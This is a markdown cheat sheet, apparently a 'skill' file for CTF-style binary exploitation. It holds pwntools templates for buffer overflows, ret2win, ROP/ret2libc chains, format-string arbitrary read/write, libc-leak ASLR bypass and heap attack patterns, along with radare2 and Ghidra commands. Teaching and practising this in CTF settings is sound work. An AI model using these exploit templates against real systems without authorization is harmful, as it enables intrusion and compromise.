# SKILL-binary — Binary Exploitation & Reverse Engineering

## Static Recon (always run first)
```bash
file ./binary          # ELF 64-bit? PIE? stripped?
checksec ./binary      # NX, PIE, canary, RELRO
strings ./binary | grep -i flag
strings ./binary | grep -i pass
objdump -d ./binary | head -100
readelf -s ./binary    # symbols
nm ./binary            # if not stripped
```

## Password / Key Checks (reverse first)
```bash
ltrace ./binary        # library calls — often shows strcmp(input, "secret")
strace ./binary        # syscalls
strings ./binary | grep -E '[A-Za-z0-9]{8,}'
# Try common: admin, password, 1234, the binary name itself
```

## Buffer Overflow
```python
from pwn import *

elf = ELF('./binary')
p = process('./binary')   # or remote('host', port)

# Find offset
payload = cyclic(200)
p.sendline(payload)
p.wait()
core = p.corefile
offset = cyclic_find(core.read(core.rsp, 4))   # x86
# offset = cyclic_find(core.fault_addr, n=8)   # x64

# ret2win — jump to win() function
win = elf.symbols['win']
payload = b'A' * offset + p64(win)   # x64
```

## ROP Chain
```python
from pwn import *
rop = ROP(elf)

# x64 calling convention: rdi, rsi, rdx → first 3 args
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

# ret2libc
payload  = b'A' * offset
payload += p64(pop_rdi) + p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])   # return to main for second stage
```

## Format String
```python
# Leak stack values
payload = b"%p " * 20           # print 20 pointers
# Find where your input appears (canary, return address, libc addresses)

# Arbitrary read
payload = b"%7$s" + p64(target_addr)   # read string at address in 7th arg

# Arbitrary write (4-byte write)
payload = fmtstr_payload(offset, {target_addr: value})
```

## PIE / ASLR Bypass
```python
# Leak a libc/binary address first (puts, printf %p, format string)
leaked = int(p.recvline(), 16)
libc.address = leaked - libc.symbols['puts']   # rebase libc

# Or: use pwntools with one_gadget
# one_gadget libc.so.6   → constraints for one-shot shell
```

## Heap Exploitation (quick patterns)
```
UAF (Use After Free): free chunk, get pointer to same chunk via another alloc, write
Tcache poisoning: overwrite fd pointer of freed chunk → alloc to arbitrary address
Double free: free same chunk twice → tcache/fastbin dup
```

## Ghidra / Radare2 Quick Commands
```
# Radare2
r2 -A ./binary
afl              # list functions
pdf @ main       # disassemble main
pdf @ sym.check_password
s sym.main; pdf  # seek + disasm

# Ghidra: import, auto-analyze, Functions window, find main / win / check_*
# Rename variables for readability; look for strcmp, strcpy, gets, scanf
```

## pwntools Boilerplate
```python
from pwn import *
context.binary = elf = ELF('./binary')
context.log_level = 'debug'

# Local
p = process()
# Remote
p = remote('challenge.ctf.io', 1337)
# GDB attach
p = gdb.debug('./binary', 'b main\nc')

p.sendline(b'payload')
p.recvuntil(b'prompt: ')
p.interactive()
```
